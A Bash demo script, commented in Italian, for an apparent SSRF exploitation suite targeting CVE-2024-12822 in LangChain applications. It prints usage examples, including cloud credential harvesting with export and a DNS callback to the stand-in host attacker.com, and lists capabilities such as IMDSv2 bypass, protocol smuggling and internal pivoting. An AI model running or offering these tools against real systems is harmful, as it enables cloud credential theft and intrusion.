#!/bin/bash
#
# Demo Script per CVE-2024-12822 Exploitation Suite
# 
# Questo script dimostra l'utilizzo di tutti i tool della suite

set -e

echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                                                               ║"
echo "║   CVE-2024-12822 Exploitation Suite - DEMO                   ║"
echo "║                                                               ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo ""

# Colori
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Verifica dipendenze
echo -e "${CYAN}[*] Checking dependencies...${NC}"
if ! python3 -c "import requests, colorama" 2>/dev/null; then
    echo -e "${YELLOW}[!] Installing dependencies...${NC}"
    pip install -r requirements.txt
fi
echo -e "${GREEN}[+] Dependencies OK${NC}"
echo ""

# Demo 1: Help dei vari tool
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}DEMO 1: Tool Help & Usage${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}1.1 - Interactive Exploit PoC${NC}"
python3 exploit_poc.py --help
echo ""

echo -e "${YELLOW}1.2 - Cloud Metadata Harvester${NC}"
python3 cloud_harvester.py --help
echo ""

echo -e "${YELLOW}1.3 - Multi-Vector SSRF Tester${NC}"
python3 multi_vector_tester.py --help
echo ""

echo -e "${YELLOW}1.4 - Report Generator${NC}"
python3 report_generator.py --help
echo ""

# Demo 2: Unified Suite
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}DEMO 2: Unified Exploitation Suite${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}Unified suite interface:${NC}"
python3 ssrf_suite.py --help
echo ""

# Demo 3: Example usage patterns
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}DEMO 3: Example Usage Patterns${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${GREEN}Example 1: Quick SSRF Test${NC}"
echo -e "${YELLOW}Command:${NC}"
echo "python3 exploit_poc.py -u http://target.com --auto"
echo ""

echo -e "${GREEN}Example 2: AWS Credential Extraction${NC}"
echo -e "${YELLOW}Command:${NC}"
echo "python3 cloud_harvester.py -u http://target.com -e /api/load --aws --export-creds"
echo ""

echo -e "${GREEN}Example 3: Multi-Vector Testing${NC}"
echo -e "${YELLOW}Command:${NC}"
echo "python3 multi_vector_tester.py -u http://target.com -e /api/load --dns-callback attacker.com"
echo ""

echo -e "${GREEN}Example 4: Generate Professional Report${NC}"
echo -e "${YELLOW}Command:${NC}"
echo "python3 report_generator.py -u http://target.com -j findings.json -o report.html"
echo ""

echo -e "${GREEN}Example 5: Full Automated Attack Chain${NC}"
echo -e "${YELLOW}Command:${NC}"
echo "python3 ssrf_suite.py -u http://target.com --full-auto"
echo ""

# Demo 4: Create sample report
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}DEMO 4: Sample Report Generation${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

echo -e "${YELLOW}[*] Generating sample report...${NC}"
python3 report_generator.py \
    -u "http://demo-vulnerable-app.example.com" \
    -s CRITICAL \
    -o demo_report.html \
    --summary "Demo report showing critical SSRF vulnerability in LangChain application"

if [ -f demo_report.html ]; then
    echo -e "${GREEN}[+] Sample report generated: demo_report.html${NC}"
    echo -e "${CYAN}[*] Open in browser to view${NC}"
    echo -e "${YELLOW}    file://$(pwd)/demo_report.html${NC}"
else
    echo -e "${RED}[-] Report generation failed${NC}"
fi
echo ""

# Demo 5: Tool capabilities summary
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${CYAN}DEMO 5: Tool Capabilities Summary${NC}"
echo -e "${CYAN}═══════════════════════════════════════════════════════════${NC}"
echo ""

cat << 'EOF'
┌─────────────────────────────────────────────────────────────────┐
│ 🎯 EXPLOIT POC (exploit_poc.py)                                 │
├─────────────────────────────────────────────────────────────────┤
│ ✓ Interactive menu system                                       │
│ ✓ Automatic endpoint discovery                                  │
│ ✓ AWS/GCP/Azure metadata extraction                             │
│ ✓ Internal port scanning                                        │
│ ✓ Custom payload support                                        │
│ ✓ Proxy integration (Burp/ZAP)                                  │
│ ✓ Full automation mode                                          │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ ☁️  CLOUD HARVESTER (cloud_harvester.py)                        │
├─────────────────────────────────────────────────────────────────┤
│ ✓ AWS IAM credential extraction                                 │
│ ✓ GCP service account tokens                                    │
│ ✓ Azure managed identity tokens                                 │
│ ✓ Alibaba Cloud credentials                                     │
│ ✓ DigitalOcean metadata                                         │
│ ✓ IMDSv2 bypass attempts                                        │
│ ✓ Export in usable formats (AWS CLI, gcloud)                    │
│ ✓ JSON export for reporting                                     │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 🔬 MULTI-VECTOR TESTER (multi_vector_tester.py)                 │
├─────────────────────────────────────────────────────────────────┤
│ ✓ 15+ bypass techniques (IP encoding, IPv6, etc.)               │
│ ✓ Timing-based blind SSRF detection                             │
│ ✓ Protocol smuggling (Gopher, Dict, LDAP)                       │
│ ✓ DNS exfiltration testing                                      │
│ ✓ URL parser confusion attacks                                  │
│ ✓ Localhost variation testing                                   │
│ ✓ Internal network pivoting                                     │
│ ✓ Redirect-based bypass                                         │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 📊 REPORT GENERATOR (report_generator.py)                       │
├─────────────────────────────────────────────────────────────────┤
│ ✓ Professional HTML reports                                     │
│ ✓ Executive summary                                             │
│ ✓ CVSS scoring & impact assessment                              │
│ ✓ Detailed technical findings                                   │
│ ✓ PoC timeline visualization                                    │
│ ✓ Remediation recommendations                                   │
│ ✓ Remediation timeline                                          │
│ ✓ Print & export friendly                                       │
└─────────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────────┐
│ 🚀 UNIFIED SUITE (ssrf_suite.py)                                │
├─────────────────────────────────────────────────────────────────┤
│ ✓ Single entry point for all tools                              │
│ ✓ Interactive menu                                              │
│ ✓ Full automated attack chain                                   │
│ ✓ Orchestrated exploitation workflow                            │
│ ✓ Integrated reporting                                          │
└─────────────────────────────────────────────────────────────────┘

EOF

echo ""
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo -e "${GREEN}DEMO COMPLETE!${NC}"
echo -e "${GREEN}═══════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${CYAN}Quick Start:${NC}"
echo -e "1. ${YELLOW}Interactive mode:${NC} python3 ssrf_suite.py"
echo -e "2. ${YELLOW}Quick test:${NC} python3 exploit_poc.py -u <target> --auto"
echo -e "3. ${YELLOW}Harvest creds:${NC} python3 cloud_harvester.py -u <target> -e <endpoint> --export-creds"
echo -e "4. ${YELLOW}Full auto:${NC} python3 ssrf_suite.py -u <target> --full-auto"
echo ""
echo -e "${RED}⚠️  Remember: Only use on authorized targets!${NC}"
echo ""
